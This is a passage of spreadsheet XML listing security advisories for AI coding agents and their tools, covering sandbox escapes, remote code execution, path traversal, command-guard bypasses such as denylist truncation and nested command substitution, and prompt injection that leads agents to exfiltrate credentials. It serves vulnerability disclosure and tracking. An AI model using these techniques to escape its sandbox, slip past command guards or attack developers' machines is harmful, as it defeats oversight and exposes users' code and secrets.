      <c r="A164" s="8" t="inlineStr">
        <is>
          <t>CA-160</t>
        </is>
      </c>
      <c r="B164" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C164" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D164" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E164" s="8" t="inlineStr">
        <is>
          <t>2026-07-09</t>
        </is>
      </c>
      <c r="F164" s="9" t="inlineStr">
        <is>
          <t>Ruflo: Unauthenticated RCE in MCP bridge default docker-compose deployment</t>
        </is>
      </c>
      <c r="G164" s="9" t="inlineStr">
        <is>
          <t>Ruflo is an agent meta-harness for Claude Code and Codex. Prior to 3.16.3, ruflo's default docker-compose deployment exposed the MCP bridge POST /mcp and POST /mcp/:group endpoints without authentication, allowing an unauthenticated network attacker to invoke tools/call to terminal_execute, obtain a shell in the bridge container, read provider API keys, and poison AgentDB learning-store patterns. This issue is fixed in version 3.16.3.</t>
        </is>
      </c>
      <c r="H164" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-59726</t>
        </is>
      </c>
    </row>
    <row r="165">
      <c r="A165" s="8" t="inlineStr">
        <is>
          <t>CA-161</t>
        </is>
      </c>
      <c r="B165" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C165" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D165" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E165" s="8" t="inlineStr">
        <is>
          <t>2026-07-10</t>
        </is>
      </c>
      <c r="F165" s="9" t="inlineStr">
        <is>
          <t>SafeInstall agent guard shell parsing can miss raw package execution</t>
        </is>
      </c>
      <c r="G165" s="9" t="inlineStr">
        <is>
          <t>## Summary  SafeInstall CLI through 0.10.1 can fail to recognize some package-manager and registry-runner commands in its agent guard. Case-variant launcher names, leading file-descriptor redirections, and supported shell wrappers with options can cause a raw install command to receive no guard decision. Remote project scaffolding through package-manager create/init commands can also avoid the approval decision used for other registry runners.  ## Impact  When the SafeInstall guard is installed for a coding agent, a crafted shell command can bypass the intended deny or ask response. The coding agent may then run a package installation or registry-provided scaffolding command without SafeInstall policy evaluation and without SafeInstall enforcing disabled lifecycle scripts.  Exploitation requires a coding agent to act on attacker-influenced instructions and issue the crafted shell command. A successful malicious package or runner can execute with the permissions of the developer account, affecting the confidentiality, integrity, and availability of local source code, credentials, and development resources.  The vulnerability is limited to guard interception. Commands already routed through the SafeInstall CLI continue to receive normal policy evaluation.  ## Affected versions  - safeinstall-cli &lt;= 0.10.1  ## Patched version  - safeinstall-cli 0.10.2  ## Fix  Version 0.10.2:  - normalizes package-manager and wrapper launcher names for detection and rewriting; - parses leading redirections before classifying the command; - handles supported wrapper option arity conservatively and fails closed on ambiguous embedded command syntax; - routes remote create/init scaffolding through the registry-runner approval path; - preserves SafeInstall routing for path-qualified package-manager invocations.  The patch includes a permanent regression corpus, table-driven parser characterization, an independent reference detector, and deterministic fuzz invariants. The integrated release candidate passed 626 tests, package smoke validation, and a one-million-command fuzz campaign with zero invariant violations.  ## Mitigation  Upgrade to safeinstall-cli 0.10.2 or later.  Until an upgrade is possible, manually review every coding-agent shell command and prevent the agent from invoking package managers or registry runners directly. Running an affected guard does not make raw package-manager execution safe.  ## Credits  Discovered, reproduced, and remediated by the SafeInstall maintainer during adversarial parser testing.</t>
        </is>
      </c>
      <c r="H165" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-xrmc-c5cg-rv7x</t>
        </is>
      </c>
    </row>
    <row r="166">
      <c r="A166" s="8" t="inlineStr">
        <is>
          <t>CA-163</t>
        </is>
      </c>
      <c r="B166" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C166" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D166" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E166" s="8" t="inlineStr">
        <is>
          <t>2026-07-14</t>
        </is>
      </c>
      <c r="F166" s="9" t="n"/>
      <c r="G166" s="9" t="inlineStr">
        <is>
          <t>Improper restriction of names for files and other resources in Github Copilot allows an unauthorized attacker to execute code locally.</t>
        </is>
      </c>
      <c r="H166" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-hjgg-v5cf-x59v</t>
        </is>
      </c>
    </row>
    <row r="167">
      <c r="A167" s="8" t="inlineStr">
        <is>
          <t>CA-164</t>
        </is>
      </c>
      <c r="B167" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C167" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D167" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E167" s="8" t="inlineStr">
        <is>
          <t>2026-07-15</t>
        </is>
      </c>
      <c r="F167" s="9" t="inlineStr">
        <is>
          <t>Cursor: Cloud Agent Browser Sandbox Escape</t>
        </is>
      </c>
      <c r="G167" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Prior to the Cloud Agent fix on 03/31/2026, browser-enabled Cursor Cloud Agent sessions allowed attacker-controlled web content to connect from inside the agent container to an unauthenticated local agent endpoint, enabling code execution within the affected Cloud Agent sandbox or session and access to files, repository contents, environment variables, credentials, and GitHub App access tokens available to that session. This issue was fixed on 03/31/2026 by requiring authentication for the relevant agent endpoint.</t>
        </is>
      </c>
      <c r="H167" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-61613</t>
        </is>
      </c>
    </row>
    <row r="168">
      <c r="A168" s="8" t="inlineStr">
        <is>
          <t>CA-165</t>
        </is>
      </c>
      <c r="B168" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C168" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D168" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E168" s="8" t="inlineStr">
        <is>
          <t>2026-07-17</t>
        </is>
      </c>
      <c r="F168" s="9" t="inlineStr">
        <is>
          <t>Cursor for Windows 3.2.16 RCE via Malicious git.exe in Workspace</t>
        </is>
      </c>
      <c r="G168" s="9" t="inlineStr">
        <is>
          <t>Cursor for Windows version 3.2.16 contains a binary planting vulnerability that allows remote attackers to achieve arbitrary code execution by placing a malicious git.exe file in the repository root directory. When a developer clones and opens a crafted repository, Cursor automatically resolves and executes the workspace-resident git.exe during IDE startup and on a recurring timed cadence without any user interaction, running the malicious binary under the privileges of the current user.</t>
        </is>
      </c>
      <c r="H168" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-63093</t>
        </is>
      </c>
    </row>
    <row r="169">
      <c r="A169" s="8" t="inlineStr">
        <is>
          <t>CA-166</t>
        </is>
      </c>
      <c r="B169" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C169" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D169" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E169" s="8" t="inlineStr">
        <is>
          <t>2026-07-20</t>
        </is>
      </c>
      <c r="F169" s="9" t="n"/>
      <c r="G169" s="9" t="inlineStr">
        <is>
          <t>Roo Code through 3.54.0 contains a command injection vulnerability in the auto-approve execute feature that allows attackers to bypass allowlist/denylist enforcement by nesting command substitutions inside parameter expansion defaults. The command parser in parse-command.ts replaces parameter expansions with opaque placeholders before extracting command substitutions, causing the containsDangerousSubstitution guard to miss nested payloads, which are then auto-approved based on the outer allowlisted command prefix and executed by the shell via execa, enabling arbitrary command execution.</t>
        </is>
      </c>
      <c r="H169" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-5xxh-cfjg-qm65</t>
        </is>
      </c>
    </row>
    <row r="170">
      <c r="A170" s="8" t="inlineStr">
        <is>
          <t>CA-167</t>
        </is>
      </c>
      <c r="B170" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C170" s="8" t="inlineStr">
        <is>
          <t>OpenAI Codex</t>
        </is>
      </c>
      <c r="D170" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E170" s="8" t="inlineStr">
        <is>
          <t>2026-07-20</t>
        </is>
      </c>
      <c r="F170" s="9" t="inlineStr">
        <is>
          <t>AI SDK Codex Harness Tool Relay Authorization Bypass</t>
        </is>
      </c>
      <c r="G170" s="9" t="inlineStr">
        <is>
          <t>The `@ai-sdk/harness-opencode` tool is an HarnessV1 adapter backed by @openai/codex-sdk, which drives the codex command line interface. Prior to version 1.0.29, the tool relay authorizes requests from any process whose command line contains an allowed helper script path (the Codex CLI shim). This allows untrusted code executing in the sandbox to invoke arbitrary host-exposed tools, including secret lookups, deployment operations, and cloud API calls  without a corresponding model-authorized tool-call event. Exploitation requires a Linux environment (the vulnerable fallback checks `process.platform === 'linux'` and reads `/proc`); an active harness session with one or more host-provided tools; and untrusted code executing in the sandbox (e.g. a malicious dependency, build script, or lifecycle hook) The fix in version 1.0.29 removes the process-path authorization fallback entirely. Relay requests are now only accepted after exact, short-lived, one-time authorization matching the tool name and input from a bridge-observed model event. Some workarounds are available. Do not run the Codex harness on untrusted repositories or with untrusted dependencies, and/or limit host-exposed tools to non-sensitive operations when working with untrusted code.</t>
        </is>
      </c>
      <c r="H170" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-64650</t>
        </is>
      </c>
    </row>
    <row r="171">
      <c r="A171" s="8" t="inlineStr">
        <is>
          <t>CA-168</t>
        </is>
      </c>
      <c r="B171" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C171" s="8" t="inlineStr">
        <is>
          <t>OpenCode</t>
        </is>
      </c>
      <c r="D171" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E171" s="8" t="inlineStr">
        <is>
          <t>2026-07-20</t>
        </is>
      </c>
      <c r="F171" s="9" t="inlineStr">
        <is>
          <t>AI SDK OpenCode Harness Tool Relay Authorization Bypass</t>
        </is>
      </c>
      <c r="G171" s="9" t="inlineStr">
        <is>
          <t>The `@ai-sdk/harness-opencode` tool connects HarnessAgent to OpenCode through a sandboxed bridge. Prior to version 1.0.28, the tool relay authorizes requests from any process whose command line contains an allowed helper script path (`host-tool-mcp.mjs`). This allows untrusted code executing in the sandbox to invoke arbitrary host-exposed tools including secret lookups, deployment operations, and cloud API calls without a corresponding model-authorized tool-call event. Exploitation requires a Linux environment (the vulnerable fallback checks `process.platform === 'linux'` and reads `/proc`); an active harness session with one or more host-provided tools; and untrusted code executing in the sandbox (e.g. a malicious dependency, build script, or lifecycle hook) The fix in version 1.0.28 removes the process-path authorization fallback entirely. Relay requests are now only accepted after exact, short-lived, one-time authorization matching the tool name and input from a bridge-observed model event. Some workarounds are available. Do not run the OpenCode harness on untrusted repositories or with untrusted dependencies, and/or limit host-exposed tools to non-sensitive operations when working with untrusted code.</t>
        </is>
      </c>
      <c r="H171" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-64651</t>
        </is>
      </c>
    </row>
    <row r="172">
      <c r="A172" s="8" t="inlineStr">
        <is>
          <t>CA-169</t>
        </is>
      </c>
      <c r="B172" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C172" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D172" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E172" s="8" t="inlineStr">
        <is>
          <t>2026-07-24</t>
        </is>
      </c>
      <c r="F172" s="9" t="inlineStr">
        <is>
          <t>Claude Code: Sandbox Escape via Git Worktree Path Confusion Allows Unsandboxed Code Execution</t>
        </is>
      </c>
      <c r="G172" s="9" t="inlineStr">
        <is>
          <t>Claude Code's worktree handling allowed creation of worktrees named ".git" and navigation to worktrees outside the sandbox context, enabling git directory confusion attacks. By exploiting symlink manipulation and git fsmonitor execution during worktree operations, an attacker could overwrite files in the user's home directory (such as .zshenv), leading to code execution outside of seatbelt sandbox restrictions. Reliably exploiting this required the user to clone a malicious repository containing prompt injection content and run Claude Code against it.  Users on standard Claude Code auto-update have received this fix automatically. Users performing manual updates are advised to update to the latest version.  Thank you to hackerone.com/metnew for reporting this issue.</t>
        </is>
      </c>
      <c r="H172" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7835-87q9-rgvv</t>
        </is>
      </c>
    </row>
    <row r="173">
      <c r="A173" s="8" t="inlineStr">
        <is>
          <t>CA-170</t>
        </is>
      </c>
      <c r="B173" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C173" s="8" t="inlineStr">
        <is>
          <t>Gemini CLI</t>
        </is>
      </c>
      <c r="D173" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E173" s="8" t="inlineStr">
        <is>
          <t>2026-07-31</t>
        </is>
      </c>
      <c r="F173" s="9" t="inlineStr">
        <is>
          <t>gemini-bridge vulnerable to arbitrary local file read via consult_gemini_with_files inline mode</t>
        </is>
      </c>
      <c r="G173" s="9" t="inlineStr">
        <is>
          <t>### Summary `consult_gemini_with_files` in **inline mode** read any file path supplied in the `files` argument without confining it to the working `directory`, then forwarded the contents to the Gemini CLI. Because the caller also controls `query`, the file contents are echoed back through the Gemini round-trip (and sent to Google), making this an arbitrary local file read.  ### Impact An MCP client — or an LLM that has been prompt-injected into calling the tool — can read **any file the server process can access** (SSH keys, cloud credentials, `.env`, source) and have it disclosed via the tool response. No code execution by itself.  ### Affected component - Tool: `consult_gemini_with_files(query, directory, files, …)`, `mode="inline"` - Sink: `_read_file_for_inline` via `_prepare_inline_payload` in `src/mcp_server.py` - The `at_command` mode already confined paths; inline mode did not.  ### Root cause `_resolve_path` returned an out-of-root path while only nullifying the *display* name, and `_prepare_inline_payload` read the file regardless. Absolute paths, `..` traversal, and symlink escapes were all accepted.  ### Patch Fixed in **1.3.1**. `_resolve_path` now resolves symlinks and confines via `Path.relative_to(root)`; inline mode skips any entry that resolves outside the working directory (the same guard `at_command` already enforced).  ### Workarounds Upgrade to 1.3.1. Before upgrading, avoid `mode="inline"` with untrusted `files` input, or run the server with a restricted-permission user.  ### Credit Reported privately by Zhihao Zhang (WPI).</t>
        </is>
      </c>
      <c r="H173" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-c5px-58j2-7fqp</t>
        </is>
      </c>
    </row>
    <row r="174">
      <c r="A174" s="8" t="inlineStr">
        <is>
          <t>CA-171</t>
        </is>
      </c>
      <c r="B174" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C174" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D174" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E174" s="8" t="inlineStr">
        <is>
          <t>2026-08-03</t>
        </is>
      </c>
      <c r="F174" s="9" t="inlineStr">
        <is>
          <t>Ouroboros: Remote Code Execution via Untrusted Project-Directory .env</t>
        </is>
      </c>
      <c r="G174" s="9" t="inlineStr">
        <is>
          <t>Ouroboros is a local-first runtime for AI coding agents that records their actions and applies user-defined policies to constrain behavior. In versions prior to 0.39.0, if a user clones a malicious repository and runs Ouroboros commands within that directory, it can lead to arbitrary code execution and potential system takeover. The vulnerability stems from Ouroboros loading the .env file from the current working directory. Execution-affecting environment variables such as OUROBOROS_CLI_PATH, OPENCODE_CLI_PATH, and other backend selectors are accepted directly from this local .env. An attacker can include a malicious script in the repository and point the CLI path variable to it (e.g., OUROBOROS_CLI_PATH=./malicious_script.sh). When the user executes a command like ouroboros init or any command that instantiates the adapter, the malicious script is executed instead of the intended CLI. This issue has been fixed in version 0.39.0.</t>
        </is>
      </c>
      <c r="H174" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-47211</t>
        </is>
      </c>
    </row>
    <row r="175">
      <c r="A175" s="8" t="inlineStr">
        <is>
          <t>CA-173</t>
        </is>
      </c>
      <c r="B175" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C175" s="8" t="inlineStr">
        <is>
          <t>Kiro</t>
        </is>
      </c>
      <c r="D175" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E175" s="8" t="inlineStr">
        <is>
          <t>2026-08-04</t>
        </is>
      </c>
      <c r="F175" s="9" t="n"/>
      <c r="G175" s="9" t="inlineStr">
        <is>
          <t>An uncontrolled search path element in Kiro IDE before version 1.0.228 on Windows might allow a remote unauthenticated actor to execute arbitrary code via a maliciously crafted project directory containing an executable that bypasses workspace trust protections when a local user opens the directory.    To remediate this issue, users should upgrade to version 1.0.228 or higher.</t>
        </is>
      </c>
      <c r="H175" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-hhmj-6g9r-9vvq</t>
        </is>
      </c>
    </row>
    <row r="176">
      <c r="A176" s="8" t="inlineStr">
        <is>
          <t>CA-174</t>
        </is>
      </c>
      <c r="B176" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C176" s="8" t="inlineStr">
        <is>
          <t>Kiro</t>
        </is>
      </c>
      <c r="D176" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E176" s="8" t="inlineStr">
        <is>
          <t>2026-08-04</t>
        </is>
      </c>
      <c r="F176" s="9" t="n"/>
      <c r="G176" s="9" t="inlineStr">
        <is>
          <t>An uncontrolled search path element in Kiro CLI before version 2.10.0 on Windows might allow a remote unauthenticated actor to execute arbitrary code via a maliciously crafted project directory containing an executable that bypasses workspace trust protections when a local user starts Kiro CLI in the directory.    To remediate this issue, users should upgrade to version 2.10.0 or higher.</t>
        </is>
      </c>
      <c r="H176" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-vr58-qjgp-x52v</t>
        </is>
      </c>
    </row>
    <row r="177">
      <c r="A177" s="8" t="inlineStr">
        <is>
          <t>CA-175</t>
        </is>
      </c>
      <c r="B177" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C177" s="8" t="inlineStr">
        <is>
          <t>OpenCode</t>
        </is>
      </c>
      <c r="D177" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E177" s="8" t="inlineStr">
        <is>
          <t>2026-08-04</t>
        </is>
      </c>
      <c r="F177" s="9" t="n"/>
      <c r="G177" s="9" t="inlineStr">
        <is>
          <t>OpenCode Studio before 2.4.4 contains a missing authentication vulnerability that allows unauthenticated remote attackers to read arbitrary files within the temp and static/music directories by directly accessing the GET /api/tmp/:tmpFile and GET /api/music/:fileName endpoints. Attackers can retrieve intermediate audio, video artifacts, and subtitles belonging to other users' jobs, and additionally delete any video by ID through the unauthenticated DELETE /api/short-video/:videoId endpoint.</t>
        </is>
      </c>
      <c r="H177" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-7fr9-h24p-27wp</t>
        </is>
      </c>
    </row>
    <row r="178">
      <c r="A178" s="8" t="inlineStr">
        <is>
          <t>CA-176</t>
        </is>
      </c>
      <c r="B178" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C178" s="8" t="inlineStr">
        <is>
          <t>OpenHands</t>
        </is>
      </c>
      <c r="D178" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E178" s="8" t="inlineStr">
        <is>
          <t>2026-08-06</t>
        </is>
      </c>
      <c r="F178" s="9" t="n"/>
      <c r="G178" s="9" t="inlineStr">
        <is>
          <t>A vulnerability was determined in OpenHands up to 0.62.0. The affected element is the function initialize_repo of the file OpenHands/resolver/send_pull_request.py. This manipulation causes command injection. Remote exploitation of the attack is possible. The vendor deleted the original GitHub issue report. It appears that the affected path/file got removed in version 1.7.0.</t>
        </is>
      </c>
      <c r="H178" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-f5cw-432q-pfqr</t>
        </is>
      </c>
    </row>
    <row r="179">
      <c r="A179" s="8" t="inlineStr">
        <is>
          <t>CA-177</t>
        </is>
      </c>
      <c r="B179" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C179" s="8" t="inlineStr">
        <is>
          <t>Roo Code</t>
        </is>
      </c>
      <c r="D179" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E179" s="8" t="inlineStr">
        <is>
          <t>2026-08-09</t>
        </is>
      </c>
      <c r="F179" s="9" t="n"/>
      <c r="G179" s="9" t="inlineStr">
        <is>
          <t>A security vulnerability has been detected in IncomeStreamSurfer roo-code-memory-bank-mcp-server up to 9dcb2fb5e6b65a35ac1983885a6d4e5621a0081e. This affects the function readMemoryBankFile/appendMemoryBankEntry of the file src/index.ts of the component read_memory_bank_file/append_memory_bank_entry. Such manipulation of the argument file_name leads to path traversal. The attack must be carried out locally. This product utilizes a rolling release system for continuous delivery, and as such, version information for affected or updated releases is not disclosed. The project was informed of the problem early through an issue report but has not responded yet.</t>
        </is>
      </c>
      <c r="H179" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-46jg-c454-8hm3</t>
        </is>
      </c>
    </row>
    <row r="180">
      <c r="A180" s="8" t="inlineStr">
        <is>
          <t>CA-178</t>
        </is>
      </c>
      <c r="B180" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C180" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D180" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E180" s="8" t="inlineStr">
        <is>
          <t>2026-08-11</t>
        </is>
      </c>
      <c r="F180" s="9" t="n"/>
      <c r="G180" s="9" t="inlineStr">
        <is>
          <t>No cwe for this issue in Visual Studio Code CoPilot Chat Extension allows an unauthorized attacker to bypass a security feature over a network.</t>
        </is>
      </c>
      <c r="H180" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-pgm3-v47m-2q8v</t>
        </is>
      </c>
    </row>
    <row r="181">
      <c r="A181" s="8" t="inlineStr">
        <is>
          <t>CA-179</t>
        </is>
      </c>
      <c r="B181" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C181" s="8" t="inlineStr">
        <is>
          <t>GitHub Copilot</t>
        </is>
      </c>
      <c r="D181" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E181" s="8" t="inlineStr">
        <is>
          <t>2026-08-11</t>
        </is>
      </c>
      <c r="F181" s="9" t="n"/>
      <c r="G181" s="9" t="inlineStr">
        <is>
          <t>Improper neutralization of special elements used in an os command ('os command injection') in GitHub Copilot and Visual Studio Code allows an unauthorized attacker to elevate privileges locally.</t>
        </is>
      </c>
      <c r="H181" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-hj52-q5wj-vpwg</t>
        </is>
      </c>
    </row>
    <row r="182">
      <c r="A182" s="8" t="inlineStr">
        <is>
          <t>CA-180</t>
        </is>
      </c>
      <c r="B182" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C182" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D182" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E182" s="8" t="inlineStr">
        <is>
          <t>2026-08-11</t>
        </is>
      </c>
      <c r="F182" s="9" t="inlineStr">
        <is>
          <t>Cursor: Sandbox escape via tampered Python virtual environments</t>
        </is>
      </c>
      <c r="G182" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Prior to 3.1.2, Cursor IDE for macOS allows an agent running in Auto-Run Sandbox mode to replace a virtual environment's Python executable with a malicious wrapper that the Microsoft Python extension invokes outside the sandbox, allowing arbitrary host commands with the user's privileges, including modifying files outside the workspace and launching applications. This issue is fixed in version 3.1.2.</t>
        </is>
      </c>
      <c r="H182" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-73217</t>
        </is>
      </c>
    </row>
    <row r="183">
      <c r="A183" s="8" t="inlineStr">
        <is>
          <t>CA-181</t>
        </is>
      </c>
      <c r="B183" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C183" s="8" t="inlineStr">
        <is>
          <t>Cursor</t>
        </is>
      </c>
      <c r="D183" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E183" s="8" t="inlineStr">
        <is>
          <t>2026-08-11</t>
        </is>
      </c>
      <c r="F183" s="9" t="inlineStr">
        <is>
          <t>Cursor: Sandbox escape via launching privileged containers</t>
        </is>
      </c>
      <c r="G183" s="9" t="inlineStr">
        <is>
          <t>Cursor is a code editor built for programming with AI. Prior to 3.0.0, Cursor IDE for macOS allows an agent running in Auto-Run Sandbox mode, when Docker Desktop and the Dev Containers CLI are installed, to launch a privileged container and mount Docker's virtiofs0, granting read and write access to the user's home directory and enabling host command execution with the user's privileges without an additional permission prompt. This issue is fixed in version 3.0.0.</t>
        </is>
      </c>
      <c r="H183" s="10" t="inlineStr">
        <is>
          <t>https://www.cve.org/CVERecord?id=CVE-2026-73218</t>
        </is>
      </c>
    </row>
    <row r="184">
      <c r="A184" s="8" t="inlineStr">
        <is>
          <t>CA-182</t>
        </is>
      </c>
      <c r="B184" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C184" s="8" t="inlineStr">
        <is>
          <t>Claude Code</t>
        </is>
      </c>
      <c r="D184" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E184" s="8" t="inlineStr">
        <is>
          <t>2026-08-13</t>
        </is>
      </c>
      <c r="F184" s="9" t="n"/>
      <c r="G184" s="9" t="inlineStr">
        <is>
          <t>Network-AI ClaudeHookBridge before 5.15.1 truncates the target string to 500 characters before evaluating denyPatterns, while Claude Code executes the full untruncated command. Attackers can position dangerous content past byte 500 in a Bash command field to bypass the operator's hard-deny list and execute arbitrary commands.</t>
        </is>
      </c>
      <c r="H184" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-64vj-7c55-24w2</t>
        </is>
      </c>
    </row>
    <row r="185">
      <c r="A185" s="8" t="inlineStr">
        <is>
          <t>CA-183</t>
        </is>
      </c>
      <c r="B185" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C185" s="8" t="inlineStr">
        <is>
          <t>SWE-agent</t>
        </is>
      </c>
      <c r="D185" s="8" t="inlineStr">
        <is>
          <t>agent product</t>
        </is>
      </c>
      <c r="E185" s="8" t="inlineStr">
        <is>
          <t>2026-08-17</t>
        </is>
      </c>
      <c r="F185" s="9" t="n"/>
      <c r="G185" s="9" t="inlineStr">
        <is>
          <t>SWE-agent's trajectory inspector (sweagent inspector), confirmed in v1.1.0, is an HTTP server that joins request paths to the trajectory directory in its /trajectory/ handler without rejecting parent-directory ('..') references, bypassing the built-in path sanitization. The server binds all interfaces (0.0.0.0), applies wildcard CORS, and requires no authentication. An unauthenticated network client (or a malicious web page via CORS) can use path traversal sequences to read files outside the intended directory. Because the read sink parses targets as trajectory JSON, disclosure is constrained to JSON files shaped like a trajectory, which can contain repository contents, command output, and secrets/API keys.</t>
        </is>
      </c>
      <c r="H185" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-hpx7-jm9p-88gh</t>
        </is>
      </c>
    </row>
    <row r="186">
      <c r="A186" s="8" t="inlineStr">
        <is>
          <t>CA-184</t>
        </is>
      </c>
      <c r="B186" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C186" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D186" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E186" s="8" t="inlineStr">
        <is>
          <t>2026-08-18</t>
        </is>
      </c>
      <c r="F186" s="9" t="n"/>
      <c r="G186" s="9" t="inlineStr">
        <is>
          <t>Context7 through 2.1.2 contains a prompt injection vulnerability that allows attackers to execute malicious instructions in connected AI coding agents by injecting unsanitized content through the Custom AI Instructions feature served via the MCP server. Attackers can poison the custom instructions to exfiltrate credentials from environment files to an attacker-controlled service and perform destructive file deletion on the victim's machine when the agent makes a routine library documentation request.</t>
        </is>
      </c>
      <c r="H186" s="10" t="inlineStr">
        <is>
          <t>https://github.com/advisories/GHSA-97r6-3rgm-v39r</t>
        </is>
      </c>
    </row>
    <row r="187">
      <c r="A187" s="8" t="inlineStr">
        <is>
          <t>CA-185</t>
        </is>
      </c>
      <c r="B187" s="8" t="inlineStr">
        <is>
          <t>W5</t>
        </is>
      </c>
      <c r="C187" s="8" t="inlineStr">
        <is>
          <t>Other coding agent</t>
        </is>
      </c>
      <c r="D187" s="8" t="inlineStr">
        <is>
          <t>ecosystem</t>
        </is>
      </c>
      <c r="E187" s="8" t="inlineStr">
        <is>
          <t>2026-08-21</t>
        </is>
      </c>
      <c r="F187" s="9" t="inlineStr">
        <is>
